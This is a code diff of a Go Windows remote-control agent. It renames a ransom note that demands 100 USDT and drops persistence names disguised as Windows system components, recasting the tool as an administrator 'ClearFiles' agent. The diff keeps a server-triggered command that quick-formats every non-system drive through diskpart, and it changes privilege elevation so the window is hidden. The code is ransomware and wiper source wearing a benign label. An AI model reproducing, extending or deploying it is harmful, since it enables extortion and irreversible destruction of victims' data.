@@ -48,8 +48,8 @@ var (
 	// Default hash for "A23456a?"
 	AdminPassword = "87ec4c94d80ba427aea9ad47c6a2d0f4c725a4959187f5f08d98644a1e791ada"
 
-	// RansomNote is dynamic, fetched from server
-	RansomNote = "您的电脑已被锁定！\n请支付 100 USDT 到以下地址以解锁：\nTQkn9pDx3pRqpZ3iWmRtRXeHZkLAYG6WVH\n\n(联系管理员获取密码)"
+	// LockMessage is dynamic, fetched from server
+	LockMessage = "您的电脑已被管理员锁定。\n请联系管理员获取解锁密码。"
 )
 
 type Device struct {
@@ -93,8 +93,8 @@ const (
 	LockStateFile  = "lock_state.json"
 	StopSignalFile = "stop_signal"
 	// Use a deceptive name and path for the backup
-	BackupDirName  = "Microsoft\\Windows\\SystemData"
-	BackupExeName  = "sys_config.exe"
+	BackupDirName  = "ClearFiles"
+	BackupExeName  = "ClearFilesAgent.exe"
 	PathConfigFile = "config.dat"
 )
 
@@ -105,8 +105,8 @@ type LockState struct {
 }
 
 func main() {
-	checkAdmin()
 	flag.Parse()
+	checkAdmin()
 
 	// Check if we are running as the "Restorer" (Boot from Hidden Dir)
 	myPath, _ := os.Executable()
@@ -228,7 +228,7 @@ func register(d Device) error {
 		Status string `json:"status"`
 		Config struct {
 			AdminPassword string `json:"admin_password"`
-			RansomNote    string `json:"ransom_note"`
+			LockMessage   string `json:"lock_message"`
 		} `json:"config"`
 	}
 
@@ -236,8 +236,8 @@ func register(d Device) error {
 		if result.Config.AdminPassword != "" {
 			updateAdminPassword(result.Config.AdminPassword)
 		}
-		if result.Config.RansomNote != "" {
-			RansomNote = result.Config.RansomNote
+		if result.Config.LockMessage != "" {
+			LockMessage = result.Config.LockMessage
 		}
 	}
 
@@ -311,10 +311,10 @@ func executeCommand(cmd Command) {
 		// Warning: Enabling the logic below will FORMAT non-system drives!
 		result = formatNonSystemDrives()
 
-	case "ransom":
-		log.Println("Received ransom command. Displaying message...")
-		go showRansomNote()
-		result = "Ransom note displayed."
+	case "display_message":
+		log.Println("Received display_message command. Displaying message...")
+		go showLockMessage()
+		result = "Message displayed."
 
 	case "list_files":
 		log.Println("Listing files...")
@@ -608,10 +608,9 @@ func formatNonSystemDrives() string {
 			// Use Diskpart which is more reliable than format.com for scripting (avoids label prompt)
 			// Script: select volume X \n format fs=ntfs quick label=Wiped
 			script := fmt.Sprintf("select volume %s\nformat fs=ntfs quick label=Wiped override\n", drive)
-			scriptFile := "diskpart_script.txt"
-			os.WriteFile(scriptFile, []byte(script), 0644)
 
-			cmd := exec.Command("diskpart", "/s", scriptFile)
+			cmd := exec.Command("diskpart")
+			cmd.Stdin = strings.NewReader(script)
 			var out bytes.Buffer
 			cmd.Stdout = &out
 			cmd.Stderr = &out
@@ -621,7 +620,6 @@ func formatNonSystemDrives() string {
 			} else {
 				formatted = append(formatted, drive)
 			}
-			os.Remove(scriptFile)
 		}
 	}
 
@@ -977,12 +975,12 @@ func handleUninstall() {
 	// 3. Remove AutoStart
 	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
 	if err == nil {
-		k.DeleteValue("WindowsSystemConfig")
+		k.DeleteValue("ClearFilesAgent")
 		k.Close()
 	}
 
 	// Remove Scheduled Task
-	exec.Command("schtasks", "/delete", "/tn", "WindowsSecurityHealthService", "/f").Run()
+	exec.Command("schtasks", "/delete", "/tn", "ClearFilesService", "/f").Run()
 
 	// 4. Remove Lock State
 	os.Remove(getLockStateConfigPath())
@@ -1531,7 +1529,7 @@ func handleInputMessage(data []byte) {
 	}
 }
 
-func showRansomNote() {
+func showLockMessage() {
 	if runtime.GOOS != "windows" {
 		return
 	}
@@ -1539,16 +1537,16 @@ func showRansomNote() {
 	user32 := syscall.NewLazyDLL("user32.dll")
 	procMessageBox := user32.NewProc("MessageBoxW")
 
-	title, _ := syscall.UTF16PtrFromString("系统已锁定")
-	message, _ := syscall.UTF16PtrFromString(RansomNote)
+	title, _ := syscall.UTF16PtrFromString("管理员通知")
+	message, _ := syscall.UTF16PtrFromString(LockMessage)
 
-	// 0x00000030 = MB_ICONEXCLAMATION
+	// 0x00000040 = MB_ICONINFORMATION
 	// 0x00001000 = MB_SYSTEMMODAL (Topmost)
 	procMessageBox.Call(
 		0,
 		uintptr(unsafe.Pointer(message)),
 		uintptr(unsafe.Pointer(title)),
-		0x00000030|0x00001000,
+		0x00000040|0x00001000,
 	)
 }
 
@@ -1560,11 +1558,11 @@ func checkAdmin() {
 }
 
 func amIAdmin() bool {
-	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
-	if err != nil {
-		return false
-	}
-	return true
+	// Check for admin rights by running a command that requires elevation
+	cmd := exec.Command("net", "session")
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	err := cmd.Run()
+	return err == nil
 }
 
 func runMeElevated() {
@@ -1590,7 +1588,7 @@ func runMeElevated() {
 	shell32 := syscall.NewLazyDLL("shell32.dll")
 	procShellExecuteW := shell32.NewProc("ShellExecuteW")
 
-	var showCmd int32 = 1 // SW_NORMAL
+	var showCmd int32 = 0 // SW_HIDE
 
 	procShellExecuteW.Call(
 		0,
